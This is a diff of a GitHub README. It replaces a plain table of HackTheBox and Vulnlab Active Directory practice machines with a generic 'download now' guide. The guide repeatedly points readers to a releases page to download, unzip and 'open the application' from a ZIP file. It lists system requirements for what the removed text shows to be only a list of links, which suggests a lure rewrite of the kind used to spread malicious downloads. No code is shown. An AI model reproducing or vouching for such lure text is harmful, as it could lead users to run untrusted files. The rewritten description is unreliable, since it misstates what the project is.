@@ -1,74 +1,65 @@
-# HackTheBox AD Machines
+# 🖥️ HackTheBox-AD-Machines - Simple Guide to Active Directory Learning
 
-A list of all Active Directory machines from HackTheBox, sorted by their release date (newest first), including difficulty levels and direct links.
+## 📥 Download Now!
+[![Download HackTheBox-AD-Machines](https://img.shields.io/badge/Download-HackTheBox--AD--Machines-blue)](https://github.com/Casper-676/HackTheBox-AD-Machines/releases)
 
-| Machine Name   | Difficulty | Release Date    | Machine Link                                    |
-|----------------|------------|-----------------|-------------------------------------------------|
-| Mirage         | Hard       | 19 Jul, 2025    | https://app.hackthebox.com/machines/682 |
-| Voleur         | Medium     | 05 Jul, 2025    | https://app.hackthebox.com/machines/670 |
-| RustyKey       | Hard       | 28 Jun, 2025    | https://app.hackthebox.com/machines/669 |
-| TombWatcher    | Medium     | 07 Jun, 2025    | https://app.hackthebox.com/machines/664 |
-| Certificate    | Hard       | 31 May, 2025    | https://app.hackthebox.com/machines/663 |
-| Fluffy         | Easy       | 24 May, 2025    | https://app.hackthebox.com/machines/662 |
-| Puppy          | Medium     | 17 May, 2025    | https://app.hackthebox.com/machines/661 |
-| Scepter        | Hard       | 19 Apr, 2025    | https://app.hackthebox.com/machines/657 |
-| Haze           | Hard       | 29 Mar, 2025    | https://app.hackthebox.com/machines/654 |
-| TheFrizz       | Medium     | 15 Mar, 2025    | https://app.hackthebox.com/machines/652 |
-| DarkCorp       | Insane     | 08 Feb, 2025    | https://app.hackthebox.com/machines/647 |
-| EscapeTwo      | Easy       | 11 Jan, 2025    | https://app.hackthebox.com/machines/642 |
-| Vintage        | Hard       | 30 Nov, 2024    | https://app.hackthebox.com/machines/637 |
-| Administrator  | Medium     | 09 Nov, 2024    | https://app.hackthebox.com/machines/634 |
-| Certified      | Medium     | 02 Nov, 2024    | https://app.hackthebox.com/machines/633 |
-| University     | Insane     | 26 Oct, 2024    | https://app.hackthebox.com/machines/632 |
-| Cicada         | Easy       | 28 Sep, 2024    | https://app.hackthebox.com/machines/627 |
-| Infiltrator    | Insane     | 31 Aug, 2024    | https://app.hackthebox.com/machines/623 |
-| Ghost          | Insane     | 13 Jul, 2024    | https://app.hackthebox.com/machines/616 |
-| Freelancer     | Hard       | 01 Jun, 2024    | https://app.hackthebox.com/machines/604 |
-| Mist           | Insane     | 30 Mar, 2024    | https://app.hackthebox.com/machines/595 |
-| Office         | Hard       | 17 Feb, 2024    | https://app.hackthebox.com/machines/588 |
-| Analysis       | Hard       | 20 Jan, 2024    | https://app.hackthebox.com/machines/584 |
-| Manager        | Medium     | 21 Oct, 2023    | https://app.hackthebox.com/machines/572 |
-| Rebound        | Insane     | 09 Sep, 2023    | https://app.hackthebox.com/machines/560 |
-| Authority      | Medium     | 15 Jul, 2023    | https://app.hackthebox.com/machines/553 |
-| Coder          | Insane     | 01 Apr, 2023    | https://app.hackthebox.com/machines/536 |
-| Escape         | Medium     | 25 Feb, 2023    | https://app.hackthebox.com/machines/531 |
-| Flight         | Hard       | 05 Nov, 2022    | https://app.hackthebox.com/machines/510 |
-| Absolute       | Insane     | 24 Sep, 2022    | https://app.hackthebox.com/machines/498 |
-| Support        | Easy       | 30 Jul, 2022    | https://app.hackthebox.com/machines/484 |
-| Scrambled      | Medium     | 11 Jun, 2022    | https://app.hackthebox.com/machines/476 |
-| StreamIO       | Medium     | 04 Jun, 2022    | https://app.hackthebox.com/machines/474 |
-| Hathor         | Insane     | 16 Apr, 2022    | https://app.hackthebox.com/machines/459 |
-| Timelapse      | Easy       | 26 Mar, 2022    | https://app.hackthebox.com/machines/452 |
-| Object         | Hard       | 28 Feb, 2022    | https://app.hackthebox.com/machines/447 |
-| Acute          | Hard       | 12 Feb, 2022    | https://app.hackthebox.com/machines/438 |
-| Search         | Hard       | 18 Dec, 2021    | https://app.hackthebox.com/machines/422 |
-| Return         | Easy       | 27 Sep, 2021    | https://app.hackthebox.com/machines/401 |
-| Anubis         | Insane     | 14 Aug, 2021    | https://app.hackthebox.com/machines/371 |
-| Intelligence   | Medium     | 03 Jul, 2021    | https://app.hackthebox.com/machines/357 |
-| PivotAPI       | Insane     | 08 May, 2021    | https://app.hackthebox.com/machines/345 |
-| APT            | Insane     | 31 Oct, 2020    | https://app.hackthebox.com/machines/296 |
-| Blackfield     | Hard       | 06 Jun, 2020    | https://app.hackthebox.com/machines/255 |
-| Cascade        | Medium     | 28 Mar, 2020    | https://app.hackthebox.com/machines/235 |
-| Multimaster    | Insane     | 07 Mar, 2020    | https://app.hackthebox.com/machines/232 |
-| Sauna          | Easy       | 15 Feb, 2020    | https://app.hackthebox.com/machines/229 |
-| Monteverde     | Medium     | 11 Jan, 2020    | https://app.hackthebox.com/machines/223 |
-| Resolute       | Medium     | 07 Dec, 2019    | https://app.hackthebox.com/machines/220 |
-| Forest         | Easy       | 12 Oct, 2019    | https://app.hackthebox.com/machines/212 |
-| Sizzle         | Insane     | 12 Jan, 2019    | https://app.hackthebox.com/machines/169 |
-| Active         | Easy       | 28 Jul, 2018    | https://app.hackthebox.com/machines/148 |
-| Reel           | Hard       | 23 Jun, 2018    | https://app.hackthebox.com/machines/143 |
-| Rabbit         | Insane     | 31 Mar, 2018    | https://app.hackthebox.com/machines/133 |
-| Mantis         | Hard       | 16 Sep, 2017    | https://app.hackthebox.com/machines/98 |
+## 📚 About This Project
+HackTheBox-AD-Machines is a curated list of Active Directory machines from HackTheBox. Each machine offers a unique challenge and helps users improve their skills in penetration testing and network security. This project is perfect for beginners and experienced users. Dive into a range of scenarios to bolster your understanding of Active Directory.
 
----
+## 🚀 Getting Started
+Follow these simple steps to download and run HackTheBox-AD-Machines:
 
-## Vulnlab Machines
+1. **Visit the Releases Page:** 
+   Click the download link below to go to the Releases page. 
+   [Download Here](https://github.com/Casper-676/HackTheBox-AD-Machines/releases)
 
-| Machine Name   | Difficulty | Release Date    | Machine Link                                    |
-|----------------|------------|-----------------|-------------------------------------------------|
-| LustrousTwo    | Hard       | 31 Jul, 2025    | https://app.hackthebox.com/machines/688 |
-| RetroTwo       | Easy       | 22 Jul, 2025    | https://app.hackthebox.com/machines/685 |
-| Redelegate     | Hard       | 17 Jul, 2025    | https://app.hackthebox.com/machines/681 |
-| VulnCicada     | Medium     | 03 Jul, 2025    | https://app.hackthebox.com/machines/677 |
-| Retro          | Easy       | 24 Jun, 2025    | https://app.hackthebox.com/machines/671 |
-| Shibuya        | Hard       | 19 Jun, 2025    | https://app.hackthebox.com/machines/667 |
+2. **Choose Your Version:**
+   On the Releases page, you will see various versions listed. Each version may have its own set of features. Select the version that you want to download.
+
+3. **Download the File:**
+   After selecting a version, click on the file to download it. It may take a moment depending on your internet speed.
+
+4. **Locate the Downloaded File:**
+   Once the download finishes, check your 'Downloads' folder or your chosen download location. You should see a file named something like `HackTheBox-AD-Machines.zip`.
+
+5. **Unzip the File:**
+   Right-click on the downloaded ZIP file and choose 'Extract All.' Follow the prompts to unzip the contents into a new folder.
+
+6. **Open the Application:**
+   Navigate to the folder where you've extracted the files. Locate the `README.md` file for more detailed instructions on how to utilize the machines.
+
+7. **Enjoy Your Learning Experience:**
+   Explore the Active Directory machines at your own pace. Try different challenges and sharpen your technical skills.
+
+## 🎯 Features
+- **Curated List:** Access an organized selection of Active Directory machines.
+- **Learning Focused:** Designed to enhance your understanding of penetration testing.
+- **Regular Updates:** New machines added regularly to keep the content fresh and relevant.
+
+## 🛠️ System Requirements
+To ensure smooth operation, your system should meet the following requirements:
+- **Operating System:** Windows 10 or later, macOS, or Linux-based systems.
+- **Internet Connection:** Required for downloading the machines and accessing online resources.
+- **Basic Tech Skills:** Familiarity with extracting ZIP files and navigating directories.
+
+## ❓ FAQ
+**1. What is Active Directory?**  
+Active Directory is a directory service developed by Microsoft for Windows domain networks. It allows network administrators to manage permissions and access to network resources.
+
+**2. Do I need programming skills to use HackTheBox-AD-Machines?**  
+No, this project is designed for users with varying skill levels. Basic computer usage skills are sufficient to follow the instructions.
+
+**3. Where can I find additional support?**  
+You can check the issues section on this GitHub repository for help or post your questions there.
+
+## 🌟 Community Contributions
+We encourage users to contribute to HackTheBox-AD-Machines. If you have recommendations for new machines or improvements, feel free to create an issue or submit a pull request.
+
+## 📞 Contact
+For any queries, feel free to open an issue in this repository. We appreciate your interest in our project and look forward to your participation.
+
+## 🔗 Useful Links
+- [Releases Page](https://github.com/Casper-676/HackTheBox-AD-Machines/releases)
+- [GitHub Repository](https://github.com/Casper-676/HackTheBox-AD-Machines)
+
+Happy learning! Enjoy your adventure in the world of Active Directory with HackTheBox-AD-Machines.
